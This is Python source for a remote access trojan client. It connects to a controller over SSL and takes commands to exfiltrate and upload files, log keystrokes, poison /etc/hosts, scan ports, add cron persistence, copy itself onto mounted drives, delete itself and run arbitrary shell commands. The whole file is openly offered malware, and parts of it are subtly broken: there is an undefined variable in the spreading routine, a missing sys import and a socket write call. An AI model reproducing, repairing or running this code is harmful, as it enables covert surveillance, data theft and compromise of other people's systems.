import socket
import subprocess
import time
import ssl
import os
import pyxhook
from Crypto.Cipher import AES

def transfer(s,path):
    if os.path.exists(path):
        d = open(path,'rb')
        packet = d.read(8192)
        while packet != '':
            s.send(encrypt(packet))
            packet = d.read(8192)
        s.send(encrypt('DONE'))
        d.close()
    else:
        s.send(encrypt('Unable to find out the file'))

def logx(event):
    fob=open(log,'a')
    fob.write(event.Key)
    fob.write(' ')
    if event.Ascii==96:
        fob.close()
        new_hook.cancel()


def encrypt(message):
        encrypting = AES.new(key,AES.MODE_CTR, counter=lambda: counter)
        return encrypting.encrypt(message)

def decrypt(message):
    decrypting = AES.new(key,AES.MODE_CTR, counter=lambda: counter)
    return decrypting.decrypt(message)

def dns(input):
    with open("/etc/hosts","a") as myfile:
        myfile.write(input)
        myfile.close()

def nodns():
    readfile = open("/etc/hosts")
    lines = readfile.readlines()
    readfile.close()
    w = open("/etc/hosts",'w')
    w.writelines([item for item in lines[:-1]])
    w.close()

def scan(ip,portlow,portmax,s):
    ip=str(ip)
    portlow=int(portlow)
    portmax=int(portmax)
    for port in range(portlow,portmax):
        ssock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ssock.settimeout(0.5)
        result=ssock.connect_ex((ip,port))
        if (result==0):
            outport= "Port " + str(port) + ": Open"
            s.send(encrypt(outport))
        ssock.close()

def upload(uploading,sockettt):
    f = open(uploading,'wb')
    while True:
        bits=decrypt(sockettt.recv(8192))
        if 'Unable to find out the file' in bits:
            print " "
        elif bits=='DONE':
            print ' '
            f.close()
            break
        f.write(bits)
    f.close()


def spread():
    points = []
    abspath=os.path.abspath(__file__)
    for point in file('/proc/mounts'):
        if point[0] == '/':
            point=point.split()
            if point[1]=='/':
                continue
            else:
                points.append(l[1])

    for places in points:
        cpcmd="cp " + str(abspath) + " " + places + "/money"
        os.system(cpcmd)

def connect():
    spread()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s = ssl.wrap_socket(s,cert_reqs=ssl.CERT_NONE)
    s.connect(('localhost',8080))
    functionality(s)


def functionality(s):
    global key, counter, log

    x = s.recv(8192)
    counter = x
    time.sleep(1)
    y = s.recv(8192)
    key = y
    while True:
        command = decrypt(s.recv(8192))
        if command=='terminate':
            timer=decrypt(s.recv(8192))
            timer=int(timer)
            s.close()
            time.sleep(timer)
            connect()
            break
            #there might be an issue because of this break
        elif 'download' in command:
            grab,path = command.split('*')
            try:
                transfer(s,path)
            except Exception,e:
                s.send(str(encrypt(e)))
                pass
        elif 'upload' in command:
            whereto=decrypt(s.recv(8192))
            upload(whereto,s)
        elif command=='panic':
            deleteme = os.path.abspath(__file__)
            os.remove(deleteme)
            sys.exit(0)
        elif command=="logx":
            log = str(decrypt(s.recv(8192)))
            directory = os.path.dirname(log)
            if os.path.exists(directory):
                s.send(encrypt("Process Started."))
                new_hook=pyxhook.HookManager()
                new_hook.KeyDown=logx
                new_hook.HookKeyboard()
                new_hook.start()
                continue
            elif not os.path.exists(directory):
                s.send(encrypt("Directory doesn't exist."))
        elif command=='logstop':
            new_hook.cancel()
        elif command=='unpersist':
            os.system("crontab -l > /tmp/crontabbb")
            os.system("echo ' ' > /tmp/crontabbb")
            os.system("crontab /tmp/crontabbb")
            os.system("rm /tmp/crontabbb")
        elif command=='persist':
            dir_path=os.path.realpath(__file__)
            executive='echo "* 1 * * * python {0}" >> /tmp/crontabbb'.format(dir_path)
            os.system("crontab -l > /tmp/crontabbb")
            os.system(executive)
            os.system("crontab /tmp/crontabbb")
            os.system("rm /tmp/crontabbb")
        elif command=='poison':
            poison= str(decrypt(s.recv(8192)))
            dns(poison)
        elif command=='delpoison':
            nodns()
        elif 'scan' in command:
            whocares,ip,portlow,portmax=command.split(' ')
            scan(ip,portlow,portmax,s)
        elif 'cd ' in command:
            code,directory = command.split(' ')
            os.chdir(directory)
            s.send(encrypt(os.getcwd()))
        else:
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            resp = CMD.stdout.read()
            #resp = CMD.communicate()[0] works as well
            if len(resp) == 0:
                s.write(encrypt(" "))
            else:
                s.write(encrypt(resp))
            

def main():
    connect()

if __name__ == '__main__':
    main()
